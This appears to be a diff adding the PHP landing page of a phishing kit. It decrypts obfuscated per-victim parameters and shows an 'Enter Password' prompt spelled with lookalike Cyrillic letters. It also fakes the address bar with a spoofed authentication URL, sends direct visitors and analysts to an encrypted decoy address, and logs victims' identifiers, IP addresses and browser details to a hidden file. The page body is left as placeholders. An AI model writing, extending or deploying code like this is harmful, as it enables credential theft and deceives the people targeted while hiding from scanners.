@@ -1,0 +1,192 @@
+<?php
+ob_start();
+session_start();
+
+// === NEW: 60‑second session expiration ===
+$session_lifetime = 60; // seconds
+if (!isset($_SESSION['expires'])) {
+    $_SESSION['expires'] = time() + $session_lifetime;
+}
+$now = time();
+$expires = $_SESSION['expires'];
+$remaining = $expires - $now;
+if ($remaining <= 0) {
+    // Session expired – clean up and stop further reloads
+    session_unset();
+    session_destroy();
+    $session_expired = true;
+} else {
+    $session_expired = false;
+}
+// =========================================
+
+$fakeUrl = 'snap/session-id-new-maintain-auth-user-en.defaultsync.cloud/krbWCgcqqjDJ2gsQt_uAlqH7To6pnYobaiad8-8NcWrwS71cA';
+if (!isset($_GET['tryw76']) && isset($_SESSION['tryw76'])) {
+    $params = array();
+    if (isset($_SESSION['tryw76'])) {
+        $params[] = 'tryw76=' . urlencode($_SESSION['tryw76']);
+    }
+    if (isset($_SESSION['texos'])) {
+        $params[] = 'texos=' . urlencode($_SESSION['texos']);
+    }
+    if (isset($_SESSION['i4n'])) {
+        $params[] = 'i4n=' . urlencode($_SESSION['i4n']);
+    }
+    
+    $url = '/' . $fakeUrl . '?' . implode('&', $params);
+    header("Location: $url");
+    exit;
+}
+if (isset($_SESSION['page_content']) && (time() - $_SESSION['saved_time'] < 60)) {
+    echo $_SESSION['page_content'];
+    exit;
+}
+
+
+include "sdhsdsdsswe1";
+$hsdgsdsdirect="bkOw5qT+fpXqxv9vmTDybiMbQm9iDQlJtutqOjoOuKtTmqfuW/pVtnXoQTYCzTvL3cRvCTlmC3M9Nw+xUWjSFbDuCLOLowWISdHSeEk= ";
+$trrrnmnfmnmv = SecureAdvCrypt::decrypt($hsdgsdsdirect);
+$fakeUrl = 'session-id-new-maintain-auth-user-en.defaultsync.cloud/krbWCgcqqjDJ2gsQt_uAlqH7To6pnYobaiad8-8NcWrwS71cA';
+        
+$folder = "hfghjjsddfvcbcb";
+if (!is_dir($folder)) {
+    mkdir($folder, 0755, true);
+}
+$file = $folder . "/hhdfddfoiuyy.txt";
+if (!file_exists($file)) {
+    file_put_contents($file, "");
+}
+
+if (isset($_GET['tryw76'])) {
+    $yuopiiii1 = $_GET['tryw76'];
+    $rwwywsdsd = str_replace(' ', '+', $yuopiiii1);
+    $dertyuik2 = SecureAdvCrypt::decrypt($rwwywsdsd);
+    if ($dertyuik2 !== null) {
+        $_GET['val9875'] = $dertyuik2;
+        $_SESSION['tryw76'] = $_GET['tryw76'];
+    } else {
+        header("Location: $trrrnmnfmnmv");
+        exit();
+    }
+} else {
+    header("Location: $trrrnmnfmnmv");
+    exit();
+}
+$heading_text = "Еntеr Раѕѕwоrd";
+if (isset($_GET['texos'])) {
+    $encrypted_texos = $_GET['texos'];
+    $encrypted_texos = str_replace(' ', '+', $encrypted_texos);
+    $decrypted_texos = SecureAdvCrypt::decrypt($encrypted_texos);
+    if ($decrypted_texos !== null) {
+        $heading_text = $decrypted_texos;
+        $_SESSION['texos'] = $_GET['texos'];
+    } else {
+        header("Location: $trrrnmnfmnmv");
+        exit();
+    }
+}
+
+$dec_i4n = null;
+if (isset($_GET['i4n'])) {
+    $enc_i4n = $_GET['i4n'];
+    $encrypted_i4n = str_replace(' ', '+', $enc_i4n);
+    $dec_i4n = SecureAdvCrypt::decrypt($enc_i4n);
+    if ($dec_i4n !== null) {
+        $heaimgg = $dec_i4n;
+        $_SESSION['i4n'] = $_GET['i4n'];
+    } else {
+        header("Location: $trrrnmnfmnmv");
+        exit();
+    }
+}
+
+$currdauuyyd = date('Y-m-d H:i:s');
+$identyrdd = isset($_GET['val9875']) ? $_GET['val9875'] : '';
+$dfdddfuser= isset($_GET['val9875']) ? $_GET['val9875'] : '';
+$sdsdsdsdsdlan = $lan = $_COOKIE['browserLanguage'] ?? substr($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'en', 0, 2);
+$sdssuserage = $_SERVER['HTTP_USER_AGENT'] ?? '';
+$URLddfd = $_SERVER['REQUEST_URI'] ?? '';
+$IPtre = $_SERVER['REMOTE_ADDR'] ?? '';
+
+$encData = SecureAdvCrypt::encrypt("\n" ."identifier:- " .$identyrdd ."\n". "User:- ". $dfdddfuser . "\n"."BrowserLanguage:- ". $sdsdsdsdsdlan . "\n"."UserAgent:- " . $sdssuserage . "\n"."Url:- " . $URLddfd . "\n"."IP:- " . $IPtre);
+
+$data = $currdauuyyd . "\n" . $encData;
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    file_put_contents($file, $data . "\n", FILE_APPEND);
+    header("Location: $trrrnmnfmnmv");
+    exit();
+} else {
+    file_put_contents($file, $data . "\n", FILE_APPEND);
+}
+?>
+<?php
+ $image = (isset($heaimgg) && $heaimgg == '0') ? 'svgimghas.png' : 'sdsvfgfggffgfgfg.png';
+// $image = isset($_GET['i4n']) && $_GET['i4n'] == '0' ? 'svgimghas.png' : 'sdsvfgfggffgfgfg.png';
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Verifying Your Request</title>
+
+<script>
+// === NEW: Fake URL + Auto‑reload at session expiration ===
+(function() {
+    // Only run if session is still active
+    var remaining = <?php echo $session_expired ? 0 : max(0, $remaining); ?>;
+    if (remaining > 0) {
+        // 1. Set the fake URL immediately (preserve query string)
+        var fakePath = '/' + <?php echo json_encode($fakeUrl); ?> + window.location.search;
+        history.replaceState({}, "", fakePath);
+
+        // 2. Reload the page exactly when the session expires
+        setTimeout(function() {
+            location.reload();
+        }, remaining * 1000);
+    }
+
+    // (Optional) Update a countdown display if you have an element with id="timer"
+    var timerSpan = document.getElementById('timer');
+    if (timerSpan && remaining > 0) {
+        var countdown = remaining;
+        setInterval(function() {
+            countdown--;
+            if (countdown >= 0) timerSpan.textContent = countdown;
+        }, 1000);
+    }
+})();
+
+// Your existing anti‑debug / anti‑devtools code (unchanged) ...
+if (window.self === window.top && window.location.search === '') {
+    const url = <?php echo json_encode($trrrnmnfmnmv); ?>;
+    if (url) {
+        window.location.href = url;
+    }
+}
+
+const fakeUrl  = 'session-id-new-maintain-auth-user-en.defaultsync.cloud/krbWCgcqqjDJ2gsQt_uAlqH7To6pnYobaiad8-8NcWrwS71cA';
+
+// Lock the URL immediately (this will be overwritten by the new function above,
+// so you can remove the duplicate lines below if you want)
+// history.replaceState({}, "", "/" + fakeUrl);
+// window.addEventListener("popstate", function () {
+//     history.replaceState({}, "", "/" + fakeUrl);
+// });
+
+</script>
+
+<style>
+/* your existing styles ... */
+</style>
+</head>
+<body>
+<!-- your existing HTML ... -->
+</body>
+</html>
+<?php
+
+$_SESSION['page_content'] = ob_get_contents();
+$_SESSION['saved_time'] = time();
+ob_end_flush();
+?>
